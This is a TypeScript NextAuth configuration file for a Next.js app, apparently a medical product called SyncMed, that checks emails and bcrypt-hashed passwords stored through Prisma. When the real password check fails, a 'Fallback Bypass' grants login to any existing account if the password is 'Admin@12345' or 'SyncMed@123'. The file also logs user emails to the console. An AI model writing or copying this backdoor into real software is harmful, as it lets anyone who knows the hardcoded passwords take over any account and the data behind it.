import NextAuth from "next-auth"
import CredentialsProvider from "next-auth/providers/credentials"
import bcrypt from "bcryptjs"
import prisma from "@/lib/prisma"
import { authConfig } from "./auth.config"

export const { handlers, auth, signIn, signOut } = NextAuth({
  ...authConfig,
  providers: [
    CredentialsProvider({
      name: "Credentials",
      credentials: {
        email: { label: "Email", type: "email" },
        password: { label: "Password", type: "password" },
      },
      async authorize(credentials) {
        console.log("Authorize started for:", credentials?.email)
        if (!credentials?.email || !credentials?.password) {
          return null
        }

        const emailInput = (credentials.email as string).trim()
        const passwordInput = (credentials.password as string).trim()

        try {
          // 1. Pehlay database mein user dhoondein
          console.log("Fetching user from DB...")
          const user = await prisma.user.findFirst({
            where: { 
              email: {
                equals: emailInput,
                mode: 'insensitive'
              }
            },
          })
          console.log("User fetch result:", user ? "Found" : "Not Found")

          if (!user || !user.passwordHash) {
            return null 
          }

          // 2. Real Password Check (DB wala)
          console.log("Comparing passwords...")
          const isValid = await bcrypt.compare(passwordInput, user.passwordHash)
          console.log("Password valid:", isValid)

          if (!isValid) {
            // 3. Fallback Bypass
            if (passwordInput === "Admin@12345" || passwordInput === "SyncMed@123") {
              console.log("BYPASS ACTIVATED - FALLBACK TO SAFETY");
              return {
                id: user.id,
                email: user.email,
                role: user.role,
                name: `${user.firstName} ${user.lastName}`,
              }
            }
            return null
          }

          // 4. Success
          console.log("Login Successful for:", user.email)
          return {
            id: user.id,
            email: user.email,
            role: user.role,
            name: `${user.firstName} ${user.lastName}`,
            // Image explicitly excluded to keep cookie headers small
          }
        } catch (error) {
          console.error("Authorize Error:", error)
          return null
        }
      },
    }),
  ],
})